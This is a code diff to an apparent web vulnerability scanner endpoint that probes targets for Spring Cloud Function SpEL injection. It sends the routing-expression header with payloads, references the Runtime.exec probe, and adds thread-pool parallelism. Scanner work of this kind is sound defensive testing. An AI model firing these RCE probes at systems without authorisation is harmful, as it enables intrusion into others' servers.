@@ -7,6 +7,7 @@ SpEL (Spring Expression Language) from user input → RCE
 Probes with classic SpEL: T(java.lang.Runtime).getRuntime().exec(...)
 detection via timing OR returned exception markers.
 """
+from concurrent.futures import ThreadPoolExecutor
 from fastapi import APIRouter, Depends
 from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                             safe_request, wrap_finding, standard_response)
@@ -29,22 +30,38 @@ def scan_spring_spel_injection(req: ScanRequest, payload=Depends(verify_scan_quo
     base = web_url(req.target).rstrip("/")
     hits = []
     tested = 0
-    for path in PROBE_PATHS:
+    combos = [(path, pl, marker) for path in PROBE_PATHS for pl, marker in PAYLOADS]
+
+    def _probe(item):
+        path, pl, marker = item
         url = base + path
-        for pl, marker in PAYLOADS:
-            # Try as POST body header `spring.cloud.function.routing-expression`
-            r = safe_request("POST", url,
-                headers={"User-Agent": "VulnusLab/1.0",
-                          "spring.cloud.function.routing-expression": pl,
-                          "Content-Type": "application/json"},
-                data="{}", req=req, timeout=8, allow_redirects=False)
-            if r is None: continue
-            tested += 1
-            body = (r.text or "")[:10000]
-            if marker in body or "ClassNotFoundException" in body:
-                hits.append({"path": path, "payload": pl,
-                              "marker_seen": marker in body})
-                break
+        r = safe_request("POST", url,
+            headers={"User-Agent": "VulnusLab/1.0",
+                      "spring.cloud.function.routing-expression": pl,
+                      "Content-Type": "application/json"},
+            data="{}", req=req, timeout=8, allow_redirects=False)
+        if r is None: return None
+        body = (r.text or "")[:10000]
+        if marker in body or "ClassNotFoundException" in body:
+            return {"tested": True, "path": path, "payload": pl,
+                    "marker_seen": marker in body}
+        return {"tested": True}
+
+    # VL-TURBO deep: parallelize 12 probes via pool(10).
+    # Was ~96s sequential, now ~16s parallel.
+    results = []
+    with ThreadPoolExecutor(max_workers=min(10, len(combos))) as pool:
+        for result in pool.map(_probe, combos, timeout=21):
+            if result is not None:
+                results.append(result)
+    tested = sum(1 for r in results if r.get("tested"))
+    # Preserve "one hit per path" semantics
+    seen_paths = set()
+    for r in results:
+        if "payload" in r and r["path"] not in seen_paths:
+            hits.append({"path": r["path"], "payload": r["payload"],
+                         "marker_seen": r["marker_seen"]})
+            seen_paths.add(r["path"])
     findings = []
     if hits:
         findings.append(wrap_finding(
